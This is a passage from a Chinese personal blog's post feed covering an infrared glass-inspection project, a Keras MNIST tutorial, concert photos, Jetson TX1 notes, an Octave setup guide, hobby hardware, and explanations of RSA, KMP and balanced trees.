<p>这是一个用红外显微镜来检测红外材料（硅玻璃、硫系玻璃）的设备。</p>
</blockquote>
<p><a href="http://qiniu.s1nh.org/Blog_%E3%80%8A%E7%8E%BB%E7%92%83%E6%A3%80%E6%B5%8B%E3%80%8B%E9%A1%B9%E7%9B%AE%E7%AD%94%E8%BE%A9.pdf">中期答辩PPT</a></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_5.jpg-QNthin"></p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_6.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_3.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_4.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_%E6%A3%80%E9%AA%8C%E6%8A%A5%E5%91%8A.png-QNthin"></p>
<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>大四的时候，项目正式立项。直接用LabView做的开发。以下是效果图</p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_1.png-QNthin" title="图像阈值化"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_2.png-QNthin" title="图像阈值化"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_Device_%E5%8E%9F%E5%A7%8B.jpeg" title="原始图像"><br><img src="http://qiniu.s1nh.org/Blog_Glass_Device_%E5%9B%BE%E5%83%8F%E5%A2%9E%E5%BC%BA.jpeg" title="图像增强"><br><img src="http://qiniu.s1nh.org/Blog_Glass_Device_%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B.jpeg" title="边缘检测"><br><img src="http://qiniu.s1nh.org/Blog_Glass_Device_3D%E8%A7%86%E5%9B%BE.jpeg" title="3D试图"></p>
<hr>
<blockquote>
<p>以下是前期做的调查和研究</p>
</blockquote>
<h3 id="算法：LSD——一个线性时间复杂度的直线检测算法"><a href="#算法：LSD——一个线性时间复杂度的直线检测算法" class="headerlink" title="算法：LSD——一个线性时间复杂度的直线检测算法"></a>算法：LSD——一个线性时间复杂度的直线检测算法</h3><p>源于一篇IPOL的文章*<a href="http://www.ipol.im/pub/art/2012/gjmr-lsd/">LSD: a Line Segment Detector</a>*；几个大神的学习日志：<a href="http://blog.csdn.net/polly_yang/article/details/10085401">论文回顾之一 一种新的直线段检测算法—LSD：a Line Segment Detector</a>，<a href="http://blog.csdn.net/tianwaifeimao/article/details/17678669">基于LSD的直线提取算法</a></p>
<p>当时三土才大二，所以并没有看懂其中的原理，只知道这是一种新的直线检测算法。它可以快速的检测图像中的直线段，然后根据目标的几何特征设计快速算法，以快速确定疑似目标区域。</p>
<p>作者提供了C语言的代码及样例。</p>
<p>现在这个算法已经加入OpenCV了。最后我们做产品也没用这个算法&gt;_&lt;</p>
<p><img src="http://qiniu.s1nh.org/Blog_LSD_1.jpeg"></p>
<!--more-->

<p><img src="http://qiniu.s1nh.org/Blog_LSD_2.jpeg"></p>
<h3 id="直线检测Demo"><a href="#直线检测Demo" class="headerlink" title="直线检测Demo"></a>直线检测Demo</h3><p>当时选用了.Net Framework，调用LSD.c生成的Dll进行混合编程。第一版的Demo效果还挺不错的</p>
<p>下图分别为玻璃内部杂质的条纹图，经过直线检测后生成的图片，对另外一张玻璃杂质进行检测的图片。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_LSD_1.png-QNthin" alt="原始图片"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_LSD_2.png-QNthin" alt="直线检测玻璃杂质"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Glass_1.png-QNthin"></p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>红外光学材料均匀性检测仪</tag>
        <tag>Labview</tag>
        <tag>LSD</tag>
      </tags>
  </entry>
  <entry>
    <title>通过MNIST熟悉Keras——《TensorFlow 实战》读书笔记</title>
    <url>/post/Keras-MNIST/</url>
    <content><![CDATA[<p>Tensorflow 的使用者虽多，但真的<strong>很难用</strong>。幸亏有基于TF和Theano的高层框架<code>Keras</code>（不幸的是Theano已经停止更新了）。我们通过MNIST来熟悉一下Keras。</p>
<blockquote>
<p>先推荐一个学习线性代数的教程<a href="http://www.bilibili.com/video/av6731067/">http://www.bilibili.com/video/av6731067/</a>，不管你多忙也请看上面这个视频。<br><a href="http://space.bilibili.com/88461692">3Blue1Brown</a>制作，深入浅出、直观明了地分享数学之美。</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>下面的代码来源于<a href="https://github.com/fchollet/keras/blob/master/examples/mnist_cnn.py">keras examples</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;Trains a simple deep NN on the MNIST dataset.</span></span><br><span class="line"><span class="string">Gets to 98.40% test accuracy after 20 epochs</span></span><br><span class="line"><span class="string">(there is *a lot* of margin for parameter tuning).</span></span><br><span class="line"><span class="string">2 seconds per epoch on a K520 GPU.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense, Dropout</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> RMSprop</span><br></pre></td></tr></table></figure>

<pre><code>Using TensorFlow backend.
</code></pre>
<h2 id="0x01-读取数据库"><a href="#0x01-读取数据库" class="headerlink" title="0x01 读取数据库"></a>0x01 读取数据库</h2><p>下面代码执行的时候会自动下载<code>https://s3.amazonaws.com/img-datasets/mnist.npz</code>到<code>~/.keras/datasets</code>目录（自动下载过程不支持断点续传，如果一次下载没成功就会一直报错，可以用<code>wget -c</code>或其它下载软件进行下载）。<em>如果你用Windows系统，请直接按Alt+F4</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># the data, shuffled and split between train and test sets</span></span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br></pre></td></tr></table></figure>

<h2 id="0x02-定义变量"><a href="#0x02-定义变量" class="headerlink" title="0x02 定义变量"></a>0x02 定义变量</h2><blockquote>
<p>很奇怪现在定义常量都不用大写字母了嘛&gt;_&lt;</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">batch_size = <span class="number">128</span></span><br><span class="line">num_classes = <span class="number">10</span></span><br><span class="line">epochs = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">x_train = x_train.reshape(<span class="number">60000</span>, <span class="number">784</span>)</span><br><span class="line">x_test = x_test.reshape(<span class="number">10000</span>, <span class="number">784</span>)</span><br><span class="line">x_train = x_train.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">x_test = x_test.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">x_train /= <span class="number">255</span></span><br><span class="line">x_test /= <span class="number">255</span></span><br><span class="line"><span class="built_in">print</span>(x_train.shape[<span class="number">0</span>], <span class="string">&#x27;train samples&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(x_test.shape[<span class="number">0</span>], <span class="string">&#x27;test samples&#x27;</span>)</span><br></pre></td></tr></table></figure>

<pre><code>60000 train samples
10000 test samples
</code></pre>
<h2 id="0x03-配置模型"><a href="#0x03-配置模型" class="headerlink" title="0x03 配置模型"></a>0x03 配置模型</h2><p>用Keras来配置模型真的很简单，一层一层的add进去就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># convert class vectors to binary class matrices</span></span><br><span class="line">y_train = keras.utils.to_categorical(y_train, num_classes)</span><br><span class="line">y_test = keras.utils.to_categorical(y_test, num_classes)</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line">model.add(Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=(<span class="number">784</span>,)))</span><br><span class="line">model.add(Dropout(<span class="number">0.2</span>))</span><br><span class="line">model.add(Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.2</span>))</span><br><span class="line">model.add(Dense(num_classes, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line"></span><br><span class="line">model.summary()</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">              optimizer=RMSprop(),</span><br><span class="line">              metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure>

<pre><code>_________________________________________________________________
Layer (type)                 Output Shape              Param #   
=================================================================
dense_1 (Dense)              (None, 512)               401920    
_________________________________________________________________
dropout_1 (Dropout)          (None, 512)               0         
_________________________________________________________________
dense_2 (Dense)              (None, 512)               262656    
_________________________________________________________________
dropout_2 (Dropout)          (None, 512)               0         
_________________________________________________________________
dense_3 (Dense)              (None, 10)                5130      
=================================================================
Total params: 669,706
Trainable params: 669,706
Non-trainable params: 0
_________________________________________________________________
</code></pre>
<h2 id="0x04-开始训练"><a href="#0x04-开始训练" class="headerlink" title="0x04 开始训练"></a>0x04 开始训练</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">history = model.fit(x_train, y_train,</span><br><span class="line">                    batch_size=batch_size,</span><br><span class="line">                    epochs=epochs,</span><br><span class="line">                    verbose=<span class="number">1</span>,</span><br><span class="line">                    validation_data=(x_test, y_test))</span><br><span class="line">score = model.evaluate(x_test, y_test, verbose=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Test loss:&#x27;</span>, score[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Test accuracy:&#x27;</span>, score[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<pre><code>Train on 60000 samples, validate on 10000 samples
Epoch 1/20
60000/60000 [==============================] - 5s - loss: 0.2453 - acc: 0.9253 - val_loss: 0.0976 - val_acc: 0.9697
Epoch 2/20
60000/60000 [==============================] - 5s - loss: 0.1009 - acc: 0.9693 - val_loss: 0.0836 - val_acc: 0.9742
Epoch 3/20
60000/60000 [==============================] - 5s - loss: 0.0749 - acc: 0.9770 - val_loss: 0.0924 - val_acc: 0.9731
Epoch 4/20
60000/60000 [==============================] - 5s - loss: 0.0601 - acc: 0.9820 - val_loss: 0.0820 - val_acc: 0.9771
Epoch 5/20
...
Epoch 19/20
60000/60000 [==============================] - 5s - loss: 0.0181 - acc: 0.9953 - val_loss: 0.1228 - val_acc: 0.9829
Epoch 20/20
60000/60000 [==============================] - 5s - loss: 0.0192 - acc: 0.9951 - val_loss: 0.1171 - val_acc: 0.9828
Test loss: 0.117063564365
Test accuracy: 0.9828
</code></pre>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>MNIST</tag>
        <tag>Tensorflow</tag>
        <tag>Keras</tag>
      </tags>
  </entry>
  <entry>
    <title>Mental Band</title>
    <url>/post/MentalLiveInVox_20150908/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/Blog_Mental_11.jpg-QNthin" alt="Mental"></p>
<span id="more"></span>
<blockquote>
<p>Mental乐队是我见过最牛逼的后摇乐队了</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_12.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_13.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_14.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_15.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_16.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_18.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_21.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_22.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_23.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_24.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_25.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_33.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_31.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_32.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_41.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_42.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_43.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_44.jpg-QNthin" alt="Mental"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Mental_45.jpg-QNthin" alt="Mental"></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>Mental</tag>
        <tag>Live</tag>
        <tag>Vox</tag>
      </tags>
  </entry>
  <entry>
    <title>NVIDIA Jetson TX1 学习资源整理</title>
    <url>/post/NVIDIA-Jetson-TX1-note/</url>
    <content><![CDATA[<blockquote>
<p>今天的朋友圈都被王宝强和她出轨的老婆刷屏了<br>想起了一句话：“他们自以为美貌是自己人生的武器，却被自己的美貌支配着走进了困顿。”</p>
</blockquote>
<h2 id="Nvidia-TX1"><a href="#Nvidia-TX1" class="headerlink" title="Nvidia TX1"></a>Nvidia TX1</h2><p>信用卡大小的 NVIDIA Jetson TX1 有内置ARM64 CPU，256 cores CUDA GPU，还内置了4G内存、16G emmc、Wi-Fi、蓝牙，集成度超级高，用来做机器人，嵌入式图像处理特别方便。 <a href="https://devblogs.nvidia.com/parallelforall/nvidia-jetson-tx1-supercomputer-on-module-drives-next-wave-of-autonomous-machines/"><strong>比较详细的一个介绍</strong></a></p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_block.png-QNthin"></p>
<span id="more"></span>

<p>联系了台湾的代理商，购买了教育优惠的 TX1 Developer Kit（导师出的钱哈哈哈） </p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_1.jpg-QNthin"></p>
<p>手头没有合适的盒子，就用了一块亚克力板保护一下，上面装了一个USB HUB、路由器。</p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_2.jpg-QNthin" title="左下角是瑞芯微ARM架构的本本，右下角为TX1，显示器运行着TX1的Ubuntu系统"></p>
<p>现在还不知道怎么连接多个摄像头，虽然有接口，但是我去哪做一块子板来接多个CSI Camera呢</p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_3.jpg-QNthin"></p>
<h2 id="扩展板"><a href="#扩展板" class="headerlink" title="扩展板"></a>扩展板</h2><p>原装的Dev Kit太大了，如果要装在无人机上还得用小一点的扩展板：<a href="http://diydrones.com/m/blogpost?id=705844:BlogPost:2257198"><strong>Nvidia 扩展版的对比</strong></a>（<a href="http://www.wtoutiao.com/p/294agBh.html">中文翻译</a>）组装起来只有一个树莓派大小（自从树莓派3出来以后，我的BeagleBone Black就放角落里吃灰了）</p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_Orbitty.png-QNthin" title="这块扩展版只有树莓派大小"></p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_Astron.png-QNthin" title="包含8个同轴输入的扩展版"></p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_chart.png-QNthin" title="扩展版对比"></p>
<h2 id="TurtleBot"><a href="#TurtleBot" class="headerlink" title="TurtleBot"></a>TurtleBot</h2><p>TurtleBot 是个开源的机器人平台，准备接下来用iRobot Create当底座，把TX1集成到这个平台上去。</p>
<p><img src="http://qiniu.s1nh.org/Blog_TX1_turtlebot_1.png-QNthin"></p>
<p><a href="http://www.turtlebot.com/">http://www.turtlebot.com/</a></p>
<h2 id="tensorflow"><a href="#tensorflow" class="headerlink" title="tensorflow"></a>tensorflow</h2><p>谷歌的深度学习系统<br><a href="https://www.tensorflow.org/">https://www.tensorflow.org/</a></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>机器人</tag>
        <tag>开源</tag>
      </tags>
  </entry>
  <entry>
    <title>开始使用 Octave</title>
    <url>/post/Octave-Tutorial/</url>
    <content><![CDATA[<p>由于基于armhf架构的Chromebook没法安装X86的binary，所以选用开源的Octave代替Matlab做科学计算</p>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>安装 octave 和 octave 缺少的函数库 <code>apt-get install octave octave-missing-functions</code></li>
<li>其它的库可以通过<code>apt-cache search octave-</code> 或者 <a href="http://wiki.octave.org/Category:Octave-Forge">http://wiki.octave.org/Category:Octave-Forge</a> 查找</li>
</ul>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>执行 <code>octave</code> 或 <code>octave-cli</code> 运行 GUI 或 控制台 界面，输入以下代码：</p>
<pre><code>x=[1,1.5,2,2.5,3];y=[0.9,1.7,2.2,2.6,3];
p=polyfit(x,y,1);
x1=linspace(min(x),max(x));
y1=polyval(p,x1);
plot(x,y,&#39;*&#39;,x1,y1);
</code></pre>
<p>结果显示如下图，这就是用Octave执行的Helloworld，一个线性回归方程：</p>
<p><img src="http://qiniu.s1nh.org/Blog_Octave_figure1.png-QNthin"></p>
<h2 id="package"><a href="#package" class="headerlink" title="package"></a>package</h2><p>执行<code>pkg list</code>查看已安装的package</p>
<p><img src="http://qiniu.s1nh.org/Blog_Octave_pkg.png-QNthin"></p>
<p>执行<code>pkg load *****</code>载入package。<code>package 名称后面带星号的为已经载入的package，例如上图的missing-functions</code></p>
<p>除了apt安装，还可以从官网可以下载package包进行安装，例如我要安装apt没有的tisean包<code>pkg install tisean-0.2.3.tar.gz</code></p>
<pre><code>&gt;&gt;pkg install tisean-0.2.3.tar.gz
error: the following dependencies were unsatisfied:
    tisean needs signal &gt;= 1.3.0
</code></pre>
<p>原来pkg包也有dependence &gt;_&lt; ，从apt安装完<code>octave-signal</code>后，再次执行<code>pkg install tisean-0.2.3.tar.gz</code>，显示</p>
<pre><code>&gt;&gt; pkg install tisean-0.2.3.tar.gz
pkg: please install the Debian package &quot;liboctave-dev&quot; to get the mkoctfile command
error: called from &#39;__gripe_missing_component__&#39; in file /usr/share/octave/4.0.3/m/help/__gripe_missing_component__.m near line 53, column 3
</code></pre>
<p>没办法，需要先用<code>apt-get install liboctave-dev</code>安装150M多的 Development files和dependence。最后再运行<code>pkg install tisean-0.2.3.tar.gz</code>，编译了半天，出现：</p>
<pre><code>&gt;&gt; pkg install tisean-0.2.3.tar.gz
ar: creating ../libsla.a
For information about changes from previous versions of the tisean package, run&#39;news tisean&#39;.
</code></pre>
<p>表示安装成功。</p>
<blockquote>
<p>注意，每次启动或者执行clean命令以后都需要重新load pkg。**如果您嫌麻烦，可以执行<code>pkg rebuild -auto *** </code>使之在启动时自动载入。其它的用法可以键入<code>doc pkg</code>查看帮助</p>
</blockquote>
]]></content>
      <categories>
        <category>科学计算</category>
      </categories>
      <tags>
        <tag>Octave</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title>三土最近迷上了开源硬件</title>
    <url>/post/Open-source_hardware/</url>
    <content><![CDATA[<p>果然再牛逼的大款也赶不上公款。<br>如果我有4万块钱闲的没地方花，我会买1000个树莓派捐给支教团。<br> <p align="center"><br><embed src="http://player.youku.com/player.php/sid/XNjM4NzIyMTk2/v.swf" allowFullScreen="true" quality="high" width="480" height="400" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed><br> </p></p>
<span id="more"></span>

<h1 id="NFC-模块"><a href="#NFC-模块" class="headerlink" title="NFC 模块"></a>NFC 模块</h1><p>看到了这个很有意思《<a href="http://www.tuicool.com/articles/zuaIb2">kali linux 下使用PN532［NFC Module For Arduino V1.0］＋CP2102［USB to Serial］读取公交卡信息</a>》就淘宝了一个RDM8800（RDM8800其实是Arduino + PN532）</p>
<p>可是，买了以后不能用。跟客服聊了半天，还拍了接线的照片给他，都没有解决，最后换上了我自己的串口模块居然好用了。量了一下电压，买的那个串口模块供电只有4.29V（差点写成4.5V，哎呀最近不知道怎么了，老觉得0.3=1/2）。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_1.jpg-QNthin" alt="开源硬件"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_2.jpg-QNthin" alt="开源硬件"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_3.jpg-QNthin" alt="开源硬件"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_4.jpg-QNthin" alt="开源硬件"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_5.jpg-QNthin" alt="开源硬件"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_6.jpg-QNthin" alt="开源硬件"></p>
<h2 id="RepRap-开源3D打印机"><a href="#RepRap-开源3D打印机" class="headerlink" title="RepRap 开源3D打印机"></a>RepRap 开源3D打印机</h2><p>应该挺有意思的，官网有卖套件有点贵，还得从国外定，不过国内有改进（仿制）的，大约1000多一点。</p>
<h2 id=""><a href="#" class="headerlink" title="**"></a>**</h2><p>这个随便看看</p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_7.png-QNthin" alt="开源硬件"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Open-source_hardware_8.png-QNthin" alt="开源硬件"></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>开源</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA，KMP，AVL树，红黑树和LLRB-tree</title>
    <url>/post/RSA-KMP-RB-TREE/</url>
    <content><![CDATA[<blockquote>
<p>这三个算法是好几年前就好奇但一直没搞懂的神奇算法</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/algorithm-23-234.png-QNthin"></p>
<span id="more"></span>


<h2 id="0x01-RSA"><a href="#0x01-RSA" class="headerlink" title="0x01 RSA"></a>0x01 RSA</h2><blockquote>
<p>RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>但实际上，在1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。<br>RSA目前是应用最广泛的加密技术之一</p>
</blockquote>
<p>RSA的生成步骤如下：</p>
<ol>
<li>随意选择两个大质数<code>p</code> <code>q</code>，并计算$N=p*q$</li>
<li>$r=(p-1)(q-1)$ 这是根据欧拉函数$r = φ(N) = φ(p)\cdotφ(q) = (p-1)\cdot(q-1)$获得的</li>
<li>选择一个小于r并与r互质的整数e（通常取<strong>65537</strong>），求得e关于r的模反元素d（$ed = 1(mod r)$，模反元素存在，当且仅当e与r互质）</li>
<li>销毁p和q</li>
<li>(N , e)是公钥，(N, d)为私钥</li>
</ol>
<p>假设明文内容<code>m</code>，密文内容<code>c</code></p>
<ul>
<li>加密过程： $m^e = c ,(\mod n ,)$</li>
<li>解密过程： $c^d = m ,(\mod n ,)$</li>
</ul>
<h2 id="0x02-KMP算法"><a href="#0x02-KMP算法" class="headerlink" title="0x02 KMP算法"></a>0x02 KMP算法</h2><p>KMP是字符串匹配的算法，由普通的O(MN)缩减到了O(M+N)。KMP 算法的意思是找到目标字符串（模式串）中已经匹配过的前缀，并略去其匹配过程。<br>先看知乎大神的解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;34623343&#x2F;answer&#x2F;59516921</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">找出句中的“我是傻逼”</span><br><span class="line">普通的字符串匹配比较傻逼：</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">我</span><br><span class="line">对上了</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">我是</span><br><span class="line">对不上了，往后移一个，我们再来</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">__我</span><br><span class="line">对上了</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">__我是</span><br><span class="line">对上了</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">__我是傻</span><br><span class="line">对不上了，往后移一下，我们再来</span><br><span class="line">等等，你傻啊，你往后移一个明显不可能对的上嘛，为毛不一下移两个呢？</span><br><span class="line">好好好，我移两个移两个</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">_____我对上了</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">_____我是对上了</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">_____我是傻对上了</span><br><span class="line">我我是我是傻我不是傻逼我是傻逼我是大傻逼</span><br><span class="line">_____我是傻逼对不上了。。。</span><br><span class="line">这次还往后移一个吗？还是……移两个？</span><br><span class="line">啊？你傻啊，你看不出来能一次往后移三个啊！！！</span><br><span class="line"></span><br><span class="line">嗯？怎么看出来的呢？</span><br><span class="line">这个嘛，当然是和我是傻逼这四个字有关系啦。匹配的越多，失配后后移的越多。</span><br><span class="line">那后移多少呢？</span><br><span class="line">那就是next数组啦。。。</span><br></pre></td></tr></table></figure>

<h2 id="0x03-AVL树与红黑树"><a href="#0x03-AVL树与红黑树" class="headerlink" title="0x03 AVL树与红黑树"></a>0x03 AVL树与红黑树</h2><p>对于普通的排序二叉树，如果运气不好（比如插入的数据本来就是有序的），那么树就会变成链表（只有左儿子或右儿子）。于是科学家们就发明了完全平衡的AVL树和允许一丢丢不平衡的红黑树。</p>
<ul>
<li>AVL树：最早的平衡二叉树之一，应用比较少。Windows对进程地址空间的管理用到了AVL树。</li>
<li>红黑树：广泛应用在C++的STL中，比如map和set都是红黑树实现的</li>
<li>B/B+树：磁盘文件组织，数据库的索引</li>
<li>Trie树：统计排序大量字符串（自动机）</li>
</ul>
<h4 id="1-AVL树（平衡二叉树）"><a href="#1-AVL树（平衡二叉树）" class="headerlink" title="1. AVL树（平衡二叉树）"></a>1. AVL树（平衡二叉树）</h4><p><code>AVL树的左子树和右子树的深度之差(平衡因子)的绝对值不超过1，且它的左子树和右子树都是一颗平衡二叉树。</code></p>
<p>为了防止排序二叉树的不平衡，AVL树中添加了平衡因子，当树不平衡时对树进行旋转。（<a href="http://blog.csdn.net/javazejian/article/details/53892797">这篇文章</a>写得很清楚）</p>
<p>其中，对右子树中插入右孩子导致不平衡需要<code>左旋</code>，对右子树中插入左孩子导致不平衡需要<code>右旋+左旋</code>。当<code>删除</code>左孩子的时候，其实相当与插入了右孩子。具体实现方法如图：</p>
<p><img src="http://qiniu.s1nh.org/algorithm-avl-1.jpg-QNthin"></p>
<h4 id="2-红黑树"><a href="#2-红黑树" class="headerlink" title="2. 红黑树"></a>2. 红黑树</h4><p><code>下图出自&quot;程序员小灰&quot;公众号</code></p>
<p><img src="http://qiniu.s1nh.org/algorithm-rat.png-QNthin" title="我这几天一直属于这种状态&gt;_&lt;"></p>
<p>红黑树的规则如下：</p>
<ol>
<li>每个节点不是红色就是黑色的；</li>
<li>根节点总是黑色的；</li>
<li>如果节点是红色的，则它的子节点必须是黑色的（反之不一定）；</li>
<li>从根节点到叶节点或空子节点的每条路径，必须包含相同数目的黑色节点（即相同的黑色高度）。   </li>
</ol>
<p>红黑树的规则太复杂了，然而我们从<a href="http://blog.csdn.net/chen_zhang_yu/article/details/52415077">这篇文章</a>中读懂红黑树的起源<code>2-3-4树</code>，问题就迎刃而解啦。</p>
<p>我们定义</p>
<ul>
<li>2节点：瘦节点</li>
<li>3节点：胖节点</li>
<li>4节点：胖胖节点</li>
</ul>
<p>因此，往瘦节点插入元素后会变成胖节点（2个值的节点）；往胖节点再插入元素时，胖节点会变成胖胖节点，接着胖胖节点分解成3个瘦节点。</p>
<p>理解2-3-4树以后再来看红黑树。以2-3-4树的理论，红节点与父节点构成了胖（胖）节点，他们彼此是等价的。因此就不难理解，旋转操作只是为了下一步计算方便，而并没有改变这等价关系。如下图。<br><img src="http://qiniu.s1nh.org/algorithm-4-node.png-QNthin"><br><img src="http://qiniu.s1nh.org/algorithm-3-node.png-QNthin"><br><img src="http://qiniu.s1nh.org/algorithm-23-rb.png-QNthin"></p>
<p>对于红黑树，插入操作分为4种情况</p>
<ol>
<li>当前节点N是树中的根节点—&gt;将节点直接染成黑色</li>
<li>当前节点的父亲P是黑色—&gt;直接添加</li>
<li><code>算法导论 情况1</code>叔叔是红色（相当与出现了5节点）—&gt;父亲，叔叔，爷爷全部变色</li>
<li><code>算法导论 情况2,3</code>叔叔是黑色（出现了胖胖节点，变成其标准形状）—&gt;将N变为左孩子（左旋），并对整颗树进行右旋。形成胖胖节点的标准形状</li>
</ol>
<p><a href="https://www.cnblogs.com/hilow/p/3949188.html">这篇文章</a>详细的介绍了红黑树的各种操作。</p>
